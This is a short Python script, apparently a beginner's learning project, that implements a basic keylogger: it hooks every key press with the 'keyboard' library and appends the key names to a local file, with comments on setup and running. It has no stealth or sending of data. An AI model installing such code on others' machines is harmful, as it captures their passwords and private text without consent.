#Ensure that you have the keyboard library installed in your Python environment. 
# Open your command prompt or terminal and execute the following command:
#pip install keyboard

import keyboard

log_file = 'keystrokes.txt'


#Inside the function, the ‘with open’ statement opens the log file in ‘append’ mode (‘a’). 
# It creates a temporary file object named ‘f’. 
# The ‘write’ method writes the name of the pressed key, obtained from ‘event.name’, to the file.
# The ‘{}\n’.format(event.name) inserts the key name into the string, and the ‘\n’ ensures each key is written on a new line.
#*I took out the \n in order to see the text better in the log file*

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}'.format(event.name))
        
keyboard.on_press(on_key_press)

keyboard.wait()

#In order to start the keylogger, go to cmd and type 'python simple_keylogger.py' inside of the directory where it exists

#Reference Used for This Simple Project:
#https://medium.com/@meetmeonmail04/a-simple-keylogger-using-python-ddc39d04b5ab